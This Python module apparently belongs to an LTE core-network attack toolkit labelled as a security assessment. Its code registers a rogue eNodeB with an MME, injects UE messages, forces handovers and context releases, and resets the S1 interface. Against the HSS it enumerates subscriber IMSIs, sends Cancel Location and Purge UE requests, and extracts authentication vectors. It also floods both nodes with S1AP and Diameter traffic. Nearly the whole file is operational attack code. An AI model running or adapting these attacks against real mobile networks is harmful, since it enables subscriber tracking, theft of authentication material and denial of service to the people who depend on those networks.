import struct
import socket
import logging
import time
from typing import Dict, List, Optional, Any, cast
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
 
from protocol.s1ap import S1APProtocol, S1APCauseRadioNetwork, S1APProcedureCode
from protocol.diameter import DiameterProtocol, DiameterResultCode, DiameterAVPCode
from core.config import TEST_CONFIG

logger = logging.getLogger(__name__)

@dataclass
class LTEAttackResult:
    attack_name: str
    target: str
    success: bool
    details: Dict[str, Any] = field(default_factory=dict)
    timestamp: float = field(default_factory=time.time)

class RogueENBAttack:
    def __init__(self, mme_ip: str):
        self.mme_ip = mme_ip
        self.s1ap = S1APProtocol()
        self.results: List[LTEAttackResult] = []
    
    def test_mme_connectivity(self, timeout: float = 3.0) -> LTEAttackResult:
        logger.info(f"[LTE] Testing MME connectivity to {self.mme_ip}:{self.s1ap.S1AP_PORT}")
        
        reachable = False
        error_msg = None
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result_code = sock.connect_ex((self.mme_ip, self.s1ap.S1AP_PORT))
            sock.close()
            reachable = (result_code == 0)
            if not reachable:
                error_msg = f"Connection failed with code {result_code}"
        except socket.timeout:
            error_msg = "Connection timed out"
        except socket.error as e:
            error_msg = str(e)
        
        result = LTEAttackResult(
            attack_name="MME Connectivity Test",
            target=self.mme_ip,
            success=reachable,
            details={
                "port": self.s1ap.S1AP_PORT,
                "reachable": reachable,
                "error": error_msg
            }
        )
        
        self.results.append(result)
        return result
        
    def register_rogue_enb(self, 
                           enb_id: int = 0xABCDE,
                           enb_name: str = "RogueENB",
                           mcc: str = "001",
                           mnc: str = "01",
                           tac: int = 0x0001) -> LTEAttackResult:
        logger.info(f"[LTE] Attempting rogue eNodeB registration to MME {self.mme_ip}")
        
        setup_request = self.s1ap.craft_s1_setup_request(
            global_enb_id=enb_id,
            enb_name=enb_name,
            mcc=mcc,
            mnc=mnc,
            tac=tac
        )
        
        response = self.s1ap.send_s1ap_message(self.mme_ip, setup_request)
        
        result = LTEAttackResult(
            attack_name="Rogue eNodeB Registration",
            target=self.mme_ip,
            success=response is not None,
            details={
                "enb_id": hex(enb_id),
                "enb_name": enb_name,
                "mcc": mcc,
                "mnc": mnc,
                "tac": tac,
                "response_received": response is not None
            }
        )
        
        if response:
            parsed = self.s1ap.parse_s1ap_message(response)
            if parsed:
                result.details["response_type"] = parsed.message_type.name
                result.details["procedure_code"] = parsed.procedure_code
                result.success = parsed.procedure_code == S1APProcedureCode.ID_S1_SETUP
        
        self.results.append(result)
        return result
    
    def inject_initial_ue_message(self,
                                   nas_pdu: Optional[bytes] = None,
                                   mcc: str = "001",
                                   mnc: str = "01") -> LTEAttackResult:
        logger.info(f"[LTE] Injecting Initial UE Message to MME {self.mme_ip}")
        
        if nas_pdu is None:
            nas_pdu = bytes([
                0x07, 0x41, 0x71, 0x08, 0x09, 0x10, 0x10, 0x00,
                0x00, 0x00, 0x00, 0x10, 0x02, 0xE0, 0xE0, 0x00,
                0x15, 0x02
            ])
        
        initial_ue = self.s1ap.craft_initial_ue_message(
            nas_pdu=nas_pdu,
            mcc=mcc,
            mnc=mnc
        )
        
        response = self.s1ap.send_s1ap_message(self.mme_ip, initial_ue)
        
        result = LTEAttackResult(
            attack_name="Initial UE Message Injection",
            target=self.mme_ip,
            success=response is not None,
            details={
                "nas_pdu_size": len(nas_pdu),
                "response_received": response is not None
            }
        )
        
        self.results.append(result)
        return result
    
    def force_handover(self,
                       mme_ue_id: int,
                       enb_ue_id: int,
                       target_enb_id: int = 0x54321,
                       target_mcc: str = "001",
                       target_mnc: str = "01") -> LTEAttackResult:
        logger.info(f"[LTE] Forcing handover for UE {mme_ue_id} to target eNB {hex(target_enb_id)}")
        
        handover_req = self.s1ap.craft_handover_required(
            mme_ue_s1ap_id=mme_ue_id,
            enb_ue_s1ap_id=enb_ue_id,
            target_enb_id=target_enb_id,
            target_mcc=target_mcc,
            target_mnc=target_mnc,
            cause=S1APCauseRadioNetwork.HANDOVER_DESIRABLE_FOR_RADIO_REASON
        )
        
        response = self.s1ap.send_s1ap_message(self.mme_ip, handover_req)
        
        result = LTEAttackResult(
            attack_name="Forced Handover",
            target=self.mme_ip,
            success=response is not None,
            details={
                "mme_ue_id": mme_ue_id,
                "enb_ue_id": enb_ue_id,
                "target_enb_id": hex(target_enb_id),
                "response_received": response is not None
            }
        )
        
        self.results.append(result)
        return result
    
    def force_ue_release(self,
                         mme_ue_id: int,
                         enb_ue_id: int,
                         cause: int = S1APCauseRadioNetwork.RADIO_CONNECTION_WITH_UE_LOST) -> LTEAttackResult:
        logger.info(f"[LTE] Forcing UE context release for {mme_ue_id}")
        
        release_req = self.s1ap.craft_ue_context_release_request(
            mme_ue_s1ap_id=mme_ue_id,
            enb_ue_s1ap_id=enb_ue_id,
            cause=cause
        )
        
        response = self.s1ap.send_s1ap_message(self.mme_ip, release_req)
        
        result = LTEAttackResult(
            attack_name="Forced UE Context Release",
            target=self.mme_ip,
            success=response is not None,
            details={
                "mme_ue_id": mme_ue_id,
                "enb_ue_id": enb_ue_id,
                "cause": cause,
                "response_received": response is not None
            }
        )
        
        self.results.append(result)
        return result
    
    def s1_interface_reset(self) -> LTEAttackResult:
        logger.info(f"[LTE] Sending S1 Interface Reset to MME {self.mme_ip}")
        
        reset_msg = self.s1ap.craft_reset(reset_type="s1-interface")
        
        response = self.s1ap.send_s1ap_message(self.mme_ip, reset_msg)
        
        result = LTEAttackResult(
            attack_name="S1 Interface Reset",
            target=self.mme_ip,
            success=response is not None,
            details={
                "reset_type": "s1-interface",
                "response_received": response is not None
            }
        )
        
        self.results.append(result)
        return result


class HSSAttack:
    def __init__(self, hss_ip: str):
        self.hss_ip = hss_ip
        self.diameter = DiameterProtocol()
        self.results: List[LTEAttackResult] = []
    
    def test_hss_connectivity(self, timeout: float = 3.0) -> LTEAttackResult:
        logger.info(f"[LTE] Testing HSS connectivity to {self.hss_ip}:{self.diameter.DIAMETER_PORT}")
        
        reachable = False
        error_msg = None
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result_code = sock.connect_ex((self.hss_ip, self.diameter.DIAMETER_PORT))
            sock.close()
            reachable = (result_code == 0)
            if not reachable:
                error_msg = f"Connection failed with code {result_code}"
        except socket.timeout:
            error_msg = "Connection timed out"
        except socket.error as e:
            error_msg = str(e)
        
        result = LTEAttackResult(
            attack_name="HSS Connectivity Test",
            target=self.hss_ip,
            success=reachable,
            details={
                "port": self.diameter.DIAMETER_PORT,
                "reachable": reachable,
                "error": error_msg
            }
        )
        
        self.results.append(result)
        return result
        
    def diameter_cer_probe(self, host_ip: str = "192.168.1.100") -> LTEAttackResult:
        logger.info(f"[LTE] Probing HSS {self.hss_ip} with Diameter CER")
        
        cer = self.diameter.craft_cer(host_ip=host_ip)
        response = self.diameter.send_diameter_message(self.hss_ip, cer)
        
        result = LTEAttackResult(
            attack_name="Diameter CER Probe",
            target=self.hss_ip,
            success=response is not None,
            details={
                "host_ip": host_ip,
                "response_received": response is not None
            }
        )
        
        if response:
            parsed = self.diameter.parse_diameter_message(response)
            if parsed:
                result.details["peer_info"] = {
                    "command_code": parsed["command_code"],
                    "application_id": parsed["application_id"],
                    "is_error": parsed["is_error"]
                }
                result.success = not parsed["is_error"]
        
        self.results.append(result)
        return result
    
    def subscriber_enumeration(self,
                                mcc: str = "001",
                                mnc: str = "01",
                                start_msin: int = 1000000000,
                                count: int = 100,
                                threads: int = 10) -> LTEAttackResult:
        logger.info(f"[LTE] Enumerating subscribers on HSS {self.hss_ip}")
        
        valid_imsis = []
        tested = 0
        
        def test_imsi(msin: int) -> Optional[str]:
            imsi = f"{mcc}{mnc}{msin:010d}"
            air = self.diameter.craft_air(imsi=imsi, num_vectors=1)
            response = self.diameter.send_diameter_message(self.hss_ip, air, timeout=2.0)
            
            if response:
                parsed = self.diameter.parse_diameter_message(response)
                if parsed:
                    for avp in parsed["avps"]:
                        if avp["code"] == DiameterAVPCode.RESULT_CODE:
                            result_code = struct.unpack(">I", avp["data"])[0] if len(avp["data"]) >= 4 else None
                            if result_code and result_code != DiameterResultCode.DIAMETER_ERROR_USER_UNKNOWN:
                                return imsi
            return None
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(test_imsi, start_msin + i): i for i in range(count)}
            
            for future in as_completed(futures):
                tested += 1
                result = future.result()
                if result:
                    valid_imsis.append(result)
                    logger.info(f"  [+] Valid IMSI found: {result}")
        
        result = LTEAttackResult(
            attack_name="Subscriber Enumeration",
            target=self.hss_ip,
            success=len(valid_imsis) > 0,
            details={
                "mcc": mcc,
                "mnc": mnc,
                "range_start": start_msin,
                "range_end": start_msin + count,
                "tested": tested,
                "valid_imsis": valid_imsis,
                "valid_count": len(valid_imsis)
            }
        )
        
        self.results.append(result)
        return result
    
    def cancel_location(self, imsi: str, cancellation_type: int = 0) -> LTEAttackResult:
        logger.info(f"[LTE] Sending Cancel Location Request for IMSI {imsi}")
        
        clr = self.diameter.craft_clr(imsi=imsi, cancellation_type=cancellation_type)
        response = self.diameter.send_diameter_message(self.hss_ip, clr)
        
        result = LTEAttackResult(
            attack_name="Cancel Location",
            target=self.hss_ip,
            success=response is not None,
            details={
                "imsi": imsi,
                "cancellation_type": cancellation_type,
                "response_received": response is not None
            }
        )
        
        if response:
            parsed = self.diameter.parse_diameter_message(response)
            if parsed:
                for avp in parsed["avps"]:
                    if avp["code"] == DiameterAVPCode.RESULT_CODE:
                        result_code = struct.unpack(">I", avp["data"])[0] if len(avp["data"]) >= 4 else None
                        result.details["result_code"] = result_code
                        result.success = result_code == DiameterResultCode.DIAMETER_SUCCESS
                        break
        
        self.results.append(result)
        return result
    
    def purge_ue(self, imsi: str) -> LTEAttackResult:
        logger.info(f"[LTE] Sending Purge UE Request for IMSI {imsi}")
        
        pur = self.diameter.craft_pur(imsi=imsi)
        response = self.diameter.send_diameter_message(self.hss_ip, pur)
        
        result = LTEAttackResult(
            attack_name="Purge UE",
            target=self.hss_ip,
            success=response is not None,
            details={
                "imsi": imsi,
                "response_received": response is not None
            }
        )
        
        if response:
            parsed = self.diameter.parse_diameter_message(response)
            if parsed:
                for avp in parsed["avps"]:
                    if avp["code"] == DiameterAVPCode.RESULT_CODE:
                        result_code = struct.unpack(">I", avp["data"])[0] if len(avp["data"]) >= 4 else None
                        result.details["result_code"] = result_code
                        result.success = result_code == DiameterResultCode.DIAMETER_SUCCESS
                        break
        
        self.results.append(result)
        return result
    
    def extract_auth_vectors(self, imsi: str, num_vectors: int = 5) -> LTEAttackResult:
        logger.info(f"[LTE] Attempting to extract auth vectors for IMSI {imsi}")
        
        air = self.diameter.craft_air(imsi=imsi, num_vectors=num_vectors)
        response = self.diameter.send_diameter_message(self.hss_ip, air)
        
        vectors = []
        result = LTEAttackResult(
            attack_name="Auth Vector Extraction",
            target=self.hss_ip,
            success=False,
            details={
                "imsi": imsi,
                "requested_vectors": num_vectors,
                "response_received": response is not None
            }
        )
        
        if response:
            parsed = self.diameter.parse_diameter_message(response)
            if parsed:
                for avp in parsed["avps"]:
                    if avp["code"] == DiameterAVPCode.AUTHENTICATION_INFO:
                        vectors.append({
                            "data": avp["data"].hex()[:64] + "..."
                        })
                    elif avp["code"] == DiameterAVPCode.E_UTRAN_VECTOR:
                        vectors.append({
                            "type": "E-UTRAN",
                            "data": avp["data"].hex()[:64] + "..."
                        })
                
                result.details["extracted_vectors"] = len(vectors)
                result.details["vectors"] = vectors
                result.success = len(vectors) > 0
        
        self.results.append(result)
        return result


class LTEDoSAttack:
    def __init__(self, target_ip: str, target_type: str = "mme"):
        self.target_ip = target_ip
        self.target_type = target_type
        self.s1ap = S1APProtocol() if target_type == "mme" else None
        self.diameter = DiameterProtocol() if target_type == "hss" else None
        self.results: List[LTEAttackResult] = []
        
    def s1ap_flood(self, count: int = 1000, threads: int = 10) -> LTEAttackResult:
        if self.target_type != "mme":
            return LTEAttackResult(
                attack_name="S1AP Flood",
                target=self.target_ip,
                success=False,
                details={"error": "Target is not MME"}
            )
        
        logger.info(f"[LTE] Starting S1AP flood attack on MME {self.target_ip}")
        
        sent = 0
        errors = 0
        error_types: Dict[str, int] = {}
        
        s1ap = cast(S1APProtocol, self.s1ap)
        
        def send_s1ap() -> Optional[str]:
            try:
                setup = s1ap.craft_s1_setup_request()
                s1ap.send_s1ap_message(self.target_ip, setup, timeout=1.0)
                return None
            except socket.timeout:
                return "timeout"
            except socket.error as e:
                return f"socket_error:{e.errno}"
            except Exception as e:
                return f"error:{type(e).__name__}"
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_s1ap) for _ in range(count)]
            for future in as_completed(futures):
                try:
                    error = future.result()
                    if error is None:
                        sent += 1
                    else:
                        errors += 1
                        error_types[error] = error_types.get(error, 0) + 1
                except Exception as e:
                    errors += 1
                    error_key = f"future_exception:{type(e).__name__}"
                    error_types[error_key] = error_types.get(error_key, 0) + 1
        
        result = LTEAttackResult(
            attack_name="S1AP Flood",
            target=self.target_ip,
            success=sent > 0,
            details={
                "packets_sent": sent,
                "errors": errors,
                "error_breakdown": error_types,
                "target_type": "MME"
            }
        )
        
        self.results.append(result)
        return result
    
    def diameter_flood(self, count: int = 1000, threads: int = 10) -> LTEAttackResult:
        if self.target_type != "hss":
            return LTEAttackResult(
                attack_name="Diameter Flood",
                target=self.target_ip,
                success=False,
                details={"error": "Target is not HSS"}
            )
        
        logger.info(f"[LTE] Starting Diameter flood attack on HSS {self.target_ip}")
        
        sent = 0
        errors = 0
        error_types: Dict[str, int] = {}
        
        diameter = cast(DiameterProtocol, self.diameter)
        
        def send_diameter() -> Optional[str]:
            try:
                dwr = diameter.craft_dwr()
                diameter.send_diameter_message(self.target_ip, dwr, timeout=1.0)
                return None
            except socket.timeout:
                return "timeout"
            except socket.error as e:
                return f"socket_error:{e.errno}"
            except Exception as e:
                return f"error:{type(e).__name__}"
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_diameter) for _ in range(count)]
            for future in as_completed(futures):
                try:
                    error = future.result()
                    if error is None:
                        sent += 1
                    else:
                        errors += 1
                        error_types[error] = error_types.get(error, 0) + 1
                except Exception as e:
                    errors += 1
                    error_key = f"future_exception:{type(e).__name__}"
                    error_types[error_key] = error_types.get(error_key, 0) + 1
        
        result = LTEAttackResult(
            attack_name="Diameter Flood",
            target=self.target_ip,
            success=sent > 0,
            details={
                "packets_sent": sent,
                "errors": errors,
                "error_breakdown": error_types,
                "target_type": "HSS"
            }
        )
        
        self.results.append(result)
        return result


def run_lte_assessment(mme_ip: Optional[str] = None, hss_ip: Optional[str] = None) -> Dict[str, Any]:
    mme_ip = mme_ip or TEST_CONFIG.get("mme_ip", "10.0.0.1")
    hss_ip = hss_ip or TEST_CONFIG.get("hss_ip", "10.0.0.2")
    
    logger.info("=" * 60)
    logger.info("4G/LTE Security Assessment")
    logger.info("=" * 60)
    
    results = {
        "mme_attacks": [],
        "hss_attacks": [],
        "summary": {
            "total_attacks": 0,
            "successful": 0,
            "failed": 0
        }
    }
    
    logger.info("\n[Phase 1] MME/S1AP Testing")
    logger.info("-" * 40)
    
    enb_attack = RogueENBAttack(mme_ip)
    
    reg_result = enb_attack.register_rogue_enb()
    results["mme_attacks"].append({
        "name": reg_result.attack_name,
        "success": reg_result.success,
        "details": reg_result.details
    })
    
    ue_result = enb_attack.inject_initial_ue_message()
    results["mme_attacks"].append({
        "name": ue_result.attack_name,
        "success": ue_result.success,
        "details": ue_result.details
    })
    
    logger.info("\n[Phase 2] HSS/Diameter Testing")
    logger.info("-" * 40)
    
    hss_attack = HSSAttack(hss_ip)
    
    cer_result = hss_attack.diameter_cer_probe()
    results["hss_attacks"].append({
        "name": cer_result.attack_name,
        "success": cer_result.success,
        "details": cer_result.details
    })
    
    enum_result = hss_attack.subscriber_enumeration(count=10)
    results["hss_attacks"].append({
        "name": enum_result.attack_name,
        "success": enum_result.success,
        "details": enum_result.details
    })
    
    all_attacks = results["mme_attacks"] + results["hss_attacks"]
    results["summary"]["total_attacks"] = len(all_attacks)
    results["summary"]["successful"] = sum(1 for a in all_attacks if a["success"])
    results["summary"]["failed"] = sum(1 for a in all_attacks if not a["success"])
    
    logger.info("\n" + "=" * 60)
    logger.info("Assessment Complete")
    logger.info(f"Total: {results['summary']['total_attacks']} | "
                f"Success: {results['summary']['successful']} | "
                f"Failed: {results['summary']['failed']}")
    logger.info("=" * 60)
    
    return results

